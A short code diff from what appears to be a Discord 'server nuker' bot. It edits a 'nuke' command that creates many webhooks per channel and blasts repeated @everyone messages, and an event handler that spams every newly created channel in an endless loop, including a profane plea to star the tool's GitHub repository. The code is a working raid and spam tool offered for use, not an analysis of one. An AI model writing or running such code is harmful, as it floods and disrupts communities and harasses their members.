@@ -84,7 +84,7 @@ async def nuke(ctx):
         for _ in range(num_webhooks):
             webhook = await channel.create_webhook(name=f"Severity{_}") 
             for _ in range(5):
-                await webhook.send(f"@everyone **Severity Was Here!")       
+                await webhook.send(f"@everyone **Severity Was Here!**")       
                 await ctx.send("Nuking the server...")  
 
 @bot.event
@@ -102,7 +102,7 @@ async def on_command_error(ctx, error):
 @bot.event
 async def on_guild_channel_create(channel):
     while True:
-        await channel.send("|| 0@everyone || **https://github.com/severityc**")
+        await channel.send("@everyone star the fucking repository https://github.com/severityc/Discord-Server-Nuker")
 
 
 @bot.command()
